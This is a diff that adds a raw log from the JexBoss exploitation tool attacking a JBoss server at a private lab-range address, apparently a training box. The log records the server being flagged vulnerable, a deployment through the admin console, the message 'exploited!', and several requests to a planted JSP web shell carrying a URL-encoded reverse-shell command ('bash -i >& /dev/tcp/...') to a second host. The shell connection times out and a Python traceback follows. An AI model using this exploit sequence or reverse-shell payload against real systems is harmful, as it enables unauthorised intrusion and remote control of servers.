@@ -1,0 +1,34 @@
+2020-09-08 21:58:54,386 (INFO): Checking Host: http://10.10.154.169:8080
+2020-09-08 21:58:55,968 (INFO): Server http://10.10.154.169:8080: EXPOSED
+2020-09-08 21:58:58,077 (INFO): Server http://10.10.154.169:8080: VULNERABLE
+2020-09-08 21:58:58,489 (INFO): Server http://10.10.154.169:8080: VULNERABLE
+2020-09-08 21:59:15,580 (INFO): Redirecting http://10.10.154.169:8080/admin-console/secure/resourceTypeSummary.seam?actionMethod=secure%2FresourceTypeSummary.xhtml%3AcreateContentBackedResourceAction.init%28%29&conversationId=10 -> http://10.10.154.169:8080/admin-console/secure/resourceContentCreate.seam?conversationId=11
+2020-09-08 21:59:18,909 (INFO): Redirecting http://10.10.154.169:8080/admin-console/secure/resourceContentCreate.seam -> http://10.10.154.169:8080/admin-console/secure/summary.seam?path=-3%2FApplications%2FWeb+Application+%28WAR%29&conversationId=11
+2020-09-08 21:59:20,333 (INFO): Redirecting http://10.10.154.169:8080/admin-console/secure/resourceContentCreate.seam -> http://10.10.154.169:8080/admin-console/index.seam?conversationId=12
+2020-09-08 21:59:20,601 (INFO): Redirecting http://10.10.154.169:8080/admin-console/index.seam?conversationId=12 -> http://10.10.154.169:8080/admin-console/error.seam?conversationId=12
+2020-09-08 21:59:20,830 (INFO): Redirecting http://10.10.154.169:8080/admin-console/error.seam?conversationId=12 -> http://10.10.154.169:8080/admin-console/error.seam?conversationId=12
+2020-09-08 21:59:35,894 (INFO): Server http://10.10.154.169:8080 exploited!
+2020-09-08 22:01:28,184 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='10.10.154.169', port=8080): Read timed out. (read timeout=6.0)",)': /jexws4/jexws4.jsp?ppp=bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.9.12.130%2F1234+0%3E%261
+2020-09-08 22:01:34,377 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='10.10.154.169', port=8080): Read timed out. (read timeout=6.0)",)': /jexws4/jexws4.jsp?ppp=bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.9.12.130%2F1234+0%3E%261
+2020-09-08 22:01:40,570 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='10.10.154.169', port=8080): Read timed out. (read timeout=6.0)",)': /jexws4/jexws4.jsp?ppp=bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.9.12.130%2F1234+0%3E%261
+2020-09-08 22:01:46,762 (ERROR): Error contacting the command shell
+Traceback (most recent call last):
+  File "jexboss.py", line 775, in shell_http
+    r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
+  File "/usr/local/lib/python2.7/dist-packages/urllib3/request.py", line 76, in request
+    method, url, fields=fields, headers=headers, **urlopen_kw
+  File "/usr/local/lib/python2.7/dist-packages/urllib3/request.py", line 97, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/local/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 336, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 767, in urlopen
+    **response_kw
+  File "/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 767, in urlopen
+    **response_kw
+  File "/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 767, in urlopen
+    **response_kw
+  File "/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 727, in urlopen
+    method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]
+  File "/usr/local/lib/python2.7/dist-packages/urllib3/util/retry.py", line 439, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='10.10.154.169', port=8080): Max retries exceeded with url: /jexws4/jexws4.jsp?ppp=bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.9.12.130%2F1234+0%3E%261 (Caused by ReadTimeoutError("HTTPConnectionPool(host='10.10.154.169', port=8080): Read timed out. (read timeout=6.0)",))
